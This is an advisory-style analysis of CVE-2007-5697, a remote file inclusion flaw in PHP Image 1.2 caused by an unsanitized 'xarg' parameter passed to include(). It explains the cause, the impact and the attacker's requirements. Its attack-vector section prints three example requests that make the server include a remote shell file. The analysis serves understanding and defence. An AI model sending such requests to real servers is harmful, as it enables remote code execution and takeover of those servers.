Based on the provided content, here's an analysis of CVE-2007-5697:

**Root Cause of Vulnerability:**
The vulnerability stems from the lack of proper input sanitization in the `xarg_corner.php`, `xarg_corner_bottom.php`, and `xarg_corner_top.php` files within PHP Image version 1.2. Specifically, the `include()` function directly incorporates user-supplied input from the `xarg` parameter without validation.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary weakness is the ability to include remote files, due to the unsanitized `xarg` parameter passed to the `include()` function.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary PHP code on the vulnerable server. This could lead to complete compromise of the system, allowing for data theft, malware installation, and other malicious actions.

**Attack Vectors:**
- **HTTP GET Request:** The attack is carried out by crafting malicious HTTP GET requests to the vulnerable scripts, specifically targeting the `xarg` parameter. For example:
    - `http://site/xarg_corner.php?xarg=http://shell.php?`
    - `http://site/xarg_corner_bottom.php?xarg=http://shell.php?`
    - `http://site/xarg_corner_top.php?xarg=http://shell.php?`

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker must have network access to the server hosting the vulnerable PHP Image application.
- **Basic Understanding of HTTP:** The attacker needs to know how to craft HTTP GET requests and supply parameters.
- **Malicious Server:** The attacker needs access to a server hosting the malicious PHP file they want to include.
